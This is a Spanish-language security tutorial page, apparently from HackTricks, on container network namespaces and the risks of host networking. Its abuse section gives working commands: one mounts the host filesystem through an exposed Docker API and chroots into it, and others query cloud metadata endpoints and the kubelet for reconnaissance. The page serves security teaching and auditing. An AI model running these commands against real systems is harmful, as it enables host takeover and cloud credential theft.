# Espacio de nombres de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Resumen

El espacio de nombres de red aísla recursos relacionados con la red como interfaces, direcciones IP, tablas de enrutamiento, estado ARP/vecinos, reglas de firewall, sockets y el contenido de archivos como `/proc/net`. Por eso un contenedor puede tener lo que parece ser su propio `eth0`, sus propias rutas locales y su propio dispositivo loopback sin poseer la pila de red real del host.

Desde la perspectiva de la seguridad, esto importa porque el aislamiento de red es mucho más que el binding de puertos. Un espacio de nombres de red privado limita lo que la carga de trabajo puede observar o reconfigurar directamente. Una vez que ese espacio de nombres se comparte con el host, el contenedor puede de repente obtener visibilidad de listeners del host, servicios locales del host y puntos de control de red que nunca debieron exponerse a la aplicación.

## Funcionamiento

Un espacio de nombres de red recién creado comienza con un entorno de red vacío o casi vacío hasta que se le adjuntan interfaces. Los runtimes de contenedores luego crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que la carga de trabajo tenga la conectividad esperada. En despliegues basados en bridge, esto suele significar que el contenedor ve una interfaz respaldada por veth conectada a un bridge del host. En Kubernetes, los plugins CNI manejan la configuración equivalente para la red de los Pod.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` suponen un cambio tan drástico. En lugar de recibir una pila de red privada preparada, la carga de trabajo se une a la pila real del host.

## Laboratorio

Puedes ver un espacio de nombres de red casi vacío con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar contenedores normales y host-networked con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El contenedor con red del host ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo es significativo incluso antes de preguntar qué capacidades tiene el proceso.

## Uso en tiempo de ejecución

Docker y Podman normalmente crean un espacio de nombres de red privado para cada contenedor salvo que se configure lo contrario. Kubernetes suele dar a cada Pod su propio espacio de nombres de red, compartido por los contenedores dentro de ese Pod pero separado del host. Los sistemas Incus/LXC también proporcionan un aislamiento rico basado en network namespaces, a menudo con una mayor variedad de configuraciones de red virtual.

El principio común es que la red privada es la frontera de aislamiento por defecto, mientras que usar la red del host es una exclusión explícita de esa frontera.

## Malconfiguraciones

La malconfiguración más importante es simplemente compartir el espacio de nombres de red del host. A veces se hace por rendimiento, monitorización a bajo nivel o conveniencia, pero elimina una de las fronteras más limpias disponibles para los contenedores. Los listeners locales del host se vuelven accesibles de forma más directa, los servicios restringidos a localhost pueden quedar accesibles, y capacidades como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas porque las operaciones que permiten se aplican ahora al propio entorno de red del host.

Otro problema es otorgar en exceso capacidades relacionadas con la red incluso cuando el espacio de nombres de red es privado. Un namespace privado ayuda, pero no hace que los raw sockets o el control avanzado de red sean inofensivos.

## Abuso

En entornos con aislamiento débil, los atacantes pueden inspeccionar servicios que escuchan en el host, alcanzar endpoints de gestión ligados sólo a loopback, sniff o interferir con el tráfico dependiendo de las capacidades y el entorno, o reconfigurar el enrutamiento y el estado del firewall si `CAP_NET_ADMIN` está presente. En un cluster, esto también puede facilitar lateral movement y control-plane reconnaissance.

Si sospechas que se está usando la red del host, comienza confirmando que las interfaces visibles y los servicios que escuchan pertenecen al host en lugar de a una red de contenedor aislada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los servicios accesibles únicamente por loopback suelen ser el primer hallazgo interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si hay capacidades de red, comprueba si la carga de trabajo puede inspeccionar o alterar la pila visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En entornos de clúster o en la nube, la red del host también justifica un rápido recon local de metadatos y de servicios adyacentes al plano de control:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Ejemplo completo: Host Networking + Local Runtime / Kubelet Access

Host networking no proporciona automáticamente host root, pero a menudo expone servicios que son intencionalmente accesibles solo desde el propio nodo. Si uno de esos servicios está poco protegido, host networking se convierte en una ruta directa de privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una local runtime API está expuesta sin la protección adecuada
- reconocimiento del cluster o movimiento lateral si kubelet o agentes locales son accesibles
- manipulación de tráfico o denial of service cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es conocer si el proceso tiene una pila de red privada, qué rutas y puertos en escucha son visibles, y si la vista de red ya se parece a la del host antes incluso de probar capacidades.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Lo interesante aquí:

- Si el identificador del namespace o el conjunto de interfaces visibles parece pertenecer al host, host networking ya puede estar en uso.
- `ss -lntup` es especialmente valioso porque revela loopback-only listeners y endpoints de gestión local.
- Las rutas, los nombres de interfaz y el contexto del firewall se vuelven mucho más importantes si `CAP_NET_ADMIN` o `CAP_NET_RAW` están presentes.

Al revisar un contenedor, siempre evalúa el network namespace junto con el capability set. Host networking combinado con capacidades de red potentes es una postura muy diferente a bridge networking combinado con un conjunto de capacidades predeterminadas limitado.
